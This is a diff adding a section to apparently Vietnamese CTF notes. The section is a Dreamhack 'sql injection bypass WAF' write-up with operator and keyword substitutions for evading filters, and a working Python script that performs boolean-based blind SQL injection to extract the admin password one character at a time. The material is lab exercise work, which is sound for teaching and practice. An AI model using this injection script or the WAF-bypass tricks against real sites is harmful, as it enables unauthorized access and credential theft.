@@ -224,5 +224,23 @@ print(f'org: {org}')
 - Câu này thật sự có thể solve bằng Chatgpt =))
 ### command-injection-chatgpt
 - y chang câu trên
+### sql injection bypass WAF
+- OR = ||
+- AND = &&
+- admin = reverse(\"nimda\")
+- Boolean based Blind SQL Injection để đoán từng kí tự của passwd
+```py
+import requests
+
+flag = ""
+for i in range(1,50):
+    for j in range(32, 128):
+        url = "http://host3.dreamhack.games:21783/?uid='||uid%3Dreverse(\"nimda\")%26%26if(ascii(substr(upw%2C{}%2C1))%3D{}%2Ctrue%2Cfalse)%23".format(i,j)
+
+        res = requests.get(url)
+        if 'admin' in res.text:
+            flag += chr(j)
+            print(flag)
+```
 ### out of money
 - 
